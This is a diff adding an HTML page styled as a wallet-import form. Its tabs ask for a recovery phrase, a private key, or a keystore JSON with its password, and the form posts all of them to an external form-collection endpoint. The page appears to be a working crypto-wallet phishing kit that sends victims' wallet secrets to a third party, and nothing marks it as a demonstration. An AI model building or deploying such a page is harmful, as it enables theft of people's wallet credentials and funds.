@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form with Tabs</title>
+    <style>
+        /* Basic styling */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+        }
+        .container {
+            width: 80%;
+            margin: 80px auto;
+            background-color: rgb(255, 255, 255);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+
+        /* Tab styles */
+        .tabs {
+            display: flex;
+            cursor: pointer;
+            justify-content: space-around;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #ddd;
+        }
+        .tabs div {
+            flex: 2;
+            text-align: center;
+            padding: 8px 0;
+            cursor: pointer;
+            background-color: #f7f7f7;
+            font-weight: bold;
+        }
+        .tabs div.active {
+            background-color: #007BFF;
+            color: white;
+            font-weight: bold;
+            border-bottom: none;
+        }
+
+        /* Tab content styles */
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Form styling */
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 20px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #7eb8f6;
+        }
+    </style>
+</head>
+<body>
+    
+<div class="container">
+    <div class="tabs">
+        <div class="tab" data-tab="phrase">Phrase</div>
+        <div class="tab" data-tab="private-key">Private Key</div>
+        <div class="tab" data-tab="keystore">Keystore</div>
+    </div>
+
+    <form class="" action="https://forms.un-static.com/forms/a773e70c22776e23db3ed587bcdffc549d53a103" method="post" id="form">
+        <!-- Phrase Tab Content -->
+        <div class="tab-content" id="phrase">
+            <label for="phrase">Enter Phrase</label>
+            <textarea id="phrase" name="phrase" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space)" rows="6"></textarea>
+        </div>
+
+        <!-- Private Key Tab Content -->
+        <div class="tab-content" id="private-key">
+            <label for="private-key">Enter Private Key</label>
+            <input type="text" id="private-key" name="private-key" placeholder="Enter your private key">
+        </div>
+
+        <!-- Keystore JSON Tab Content -->
+        <div class="tab-content" id="keystore">
+            <label for="keystore-json">Keystore JSON</label>
+            <textarea id="keystore-json" name="keystore-json" placeholder="Input your Keystore JSON" rows="6"></textarea>
+            <label for="password">Password</label>
+            <input type="text" id="password" name="password" placeholder="Enter Kestore password">
+        </div>
+
+        <button type="submit">Import Wallet</button>
+    </form>
+</div>
+
+<script>
+    // Initialize active tab
+    document.querySelectorAll('.tabs .tab')[0].classList.add('active');
+    document.querySelectorAll('.tab-content')[0].classList.add('active');
+
+    // Tab click event handler
+    document.querySelectorAll('.tabs .tab').forEach(tab => {
+        tab.addEventListener('click', function() {
+            // Remove active class from all tabs and content
+            document.querySelectorAll('.tabs .tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+
+            // Add active class to clicked tab and corresponding content
+            const tabId = tab.getAttribute('data-tab');
+            document.querySelector(`#${tabId}`).classList.add('active');
+            tab.classList.add('active');
+        });
+    });
+</script>
+
+</body>
+</html>
